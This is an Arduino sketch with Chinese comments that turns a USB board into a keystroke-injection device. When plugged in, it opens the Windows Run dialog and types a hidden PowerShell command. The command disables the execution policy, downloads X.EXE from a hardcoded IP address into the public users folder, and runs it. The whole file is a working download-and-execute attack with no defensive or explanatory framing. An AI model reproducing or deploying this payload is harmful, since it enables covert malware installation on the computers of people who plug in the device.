void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("POWERSHELL -NOP -W HIDDEN -C sET-eXECUTIONpOLICY UNRESTRICTED -FORCE;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE('HTTP://112.86.165.63/X.EXE', 'c:\\USERS\\PUBLIC\\X.EXE');START c:\\USERS\\PUBLIC\\X.EXE;EXIT");
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
